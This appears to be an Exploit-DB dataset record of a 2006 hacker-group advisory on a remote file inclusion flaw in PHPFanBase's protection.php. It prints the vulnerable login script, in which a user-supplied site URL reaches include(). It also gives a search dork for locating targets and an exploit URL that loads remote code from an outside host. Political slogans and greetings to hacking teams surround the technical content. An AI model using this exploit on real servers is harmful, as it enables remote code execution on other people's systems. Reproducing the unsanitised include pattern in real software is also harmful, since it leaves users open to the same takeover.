{
  "id": "2957",
  "title": "PHPFanBase 2.x - &#039;protection.php&#039; Remote File Inclusion",
  "cve": null,
  "vuln_type": "rce",
  "code": "--------------------------------------||    Viva Palestine     ||-----------------------------------------\r\n--------------------------------------||  Free Saddam Hussien  ||-----------------------------------------\r\n\r\n\r\nPHPFanBase (protection.php) Remote File Include Vulnerability\r\n\r\nFound By  :  CoLd Zero  [ Wasem898 ]\r\nSource    :  www.4azhar.com\r\n            SpECiALPowEr.oRg\r\n            A_mal Team\r\n\r\nPalesTine Arab Muslim Hacker\r\n\r\nhttp://www.smileygenerator.us/smileysig2/links/918742001154432992.final.gif\r\n\r\n######################################################\r\n#\r\n#            PHPFanBase ]All[\r\n#\r\n# Class:     Remote File Include Vulnerability\r\n# Published  2006-12-19\r\n# Remote:    Yes\r\n# Type:      Dangerous\r\n# Site:      http://codegrrl.com/!/scripts/\r\n#\r\n# Author:    Cold Zero\r\n# Contact:   c.o.1.d.0@hotmail.com\r\n#\r\n# Dork: Powered By PHPFanBase\r\n######################################################\r\n\r\nFile :\r\n\r\n/protection.php\r\n\r\n===========================\r\n\r\n<?\r\n\r\n\r\n$user_passwords = array (\r\n\r\n       \"$admin_username\" => \"$admin_password\"  );\r\n\r\n// This is the page to show when the user has been logged out\r\n$logout_page = \"$siteurl\";\r\n\r\n// Page with login form\r\n$login_page = \"login.php\";\r\n\r\n// Page to show if the user enters an invalid login name or password\r\n$invalidlogin_page = \"invalidlogin.php\";\r\n\r\n\r\n//DON'T EDIT ANYTHING BELOW THIS!!!\r\n\r\nif ($action == \"logout\")\r\n{\r\n       Setcookie(\"logincookie[pwd]\",\"\",time() -86400);\r\n       Setcookie(\"logincookie[user]\",\"\",time() - 86400);\r\n       include($logout_page);\r\n       exit;\r\n}\r\nelse if ($action == \"login\")\r\n{\r\n       if (($loginname == \"\") || ($password == \"\"))\r\n       {\r\n               include($invalidlogin_page);\r\n               exit;\r\n       }\r\n       else if (strcmp($user_passwords[$loginname],$password) == 0)\r\n       {\r\n               Setcookie(\"logincookie[pwd]\",$password,time() + 86400);\r\n               Setcookie(\"logincookie[user]\",$loginname,time() + 86400);\r\n       }\r\n       else\r\n       {\r\n               include($invalidlogin_page);\r\n               exit;\r\n       }\r\n}\r\nelse\r\n{\r\n       if (($logincookie[pwd] == \"\") || ($logincookie[user] == \"\"))\r\n       {\r\n               include($login_page);\r\n               exit;\r\n       }\r\n       else if\r\n(strcmp($user_passwords[$logincookie[user]],$logincookie[pwd]) =\r\n= 0)\r\n       {\r\n               Setcookie(\"logincookie[pwd]\",$logincookie[pwd],time() +\r\n86400);\r\n               Setcookie(\"logincookie[user]\",$logincookie[user],time() +\r\n86400)\r\n;\r\n       }\r\n       else\r\n       {\r\n               include($invalidlogin_page);\r\n               exit;\r\n       }\r\n}\r\n\r\n\r\n===========================\r\n\r\nExploit :\r\n\r\nHttp://www.Victem.0/[PaTH]/protection.php?action=logout&siteurl=http://4azhar.com/soft.txt?\r\n\r\n\r\n======================================================\r\n\r\n----  GreeTz: [MoHaNdKo]  [Cold One]  [Cold ThreE] [Viper Hacker] [The Wolf KSA] [o0xxdark0o[ [OrGanza] [H@mLiT] [Snake12][Root Shell]\r\n             [Metoovit] [Fucker_net] [Rageb][CoDeR] [HuGe][Str0ke] [Dr.TaiGaR[ [JEeN HacKer] [Nazy L!unx[  Everyone I know\r\n\r\n\r\n****************************************************************\r\n# *www.4azhar.com Securty Team    >>      www.4azhar.com        *\r\n# *SpeciaL PoweR SecuritY Team    >>      www.specialpower.org  *\r\n# *A_mal Hacking Team             >>      -vv -l -p The-Pradise *\r\n*****************************************************************\r\n\r\n\r\nhttp://www.smileygenerator.us/smileysig2/links/918742001154432992.final.gif\r\n\r\n\r\n--------------------------------------||    Viva Palestine     ||-----------------------------------------\r\n--------------------------------------||  Free Saddam Hussien  ||-----------------------------------------\r\n\r\n# milw0rm.com [2006-12-19]",
  "url": "https://www.exploit-db.com/exploits/2957"
}